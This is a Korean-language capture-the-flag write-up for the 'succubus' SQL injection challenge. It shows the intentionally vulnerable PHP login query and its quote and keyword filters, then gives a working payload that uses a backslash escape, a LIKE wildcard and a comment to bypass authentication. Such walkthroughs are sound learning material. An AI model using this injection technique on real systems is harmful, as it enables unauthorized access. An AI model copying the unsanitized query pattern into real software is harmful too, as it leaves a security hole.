# SUCCUBUS

## Problem
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/\'/i', $_GET[id])) exit("HeHe"); 
  if(preg_match('/\'/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("succubus"); 
  highlight_file(__FILE__); 
?>
```

## Inspection
* `if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");`
* `if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");`
	- 파라미터의 `id`, `pw`에서 `prob`, `_`, `.`, `(`, `)`를 거른다.
* `if(preg_match('/\'/i', $_GET[id])) exit("HeHe");`
* `if(preg_match('/\'/i', $_GET[pw])) exit("HeHe");`
	- 파라미터의 `id`, `pw`에서 `'`(작은따옴표, single quote)를 거른다.
* `select id from prob_succubus where id='{$_GET[id]}' and pw='{$_GET[pw]}'`
	- 파라미터로 `id`와 `pw`를 받는다.
	- `id`와 `pw` 양옆에 작은따옴표가 감싼다.
* `if($result['id']) solve("succubus");`
	- 쿼리문의 결과가 뜬다면 통과한다.

## Solution
* Escaped character와 `LIKE` operator, 주석 처리를 이용한다.
	- `?id=\&pw=or id like "%" --%20`
	- `select id from prob_succubus where id='\' and pw='or id like "%" -- '`
	- `\`을 넣어 두번째 `'`를 escaped 상태로 만들어 `id`에 `\' and pw=`가 들어가도록 만든다. 
	- `pw`에 원하는 구문을 삽입한 뒤 맨 마지막 `'`를 주석 처리로 제거한다.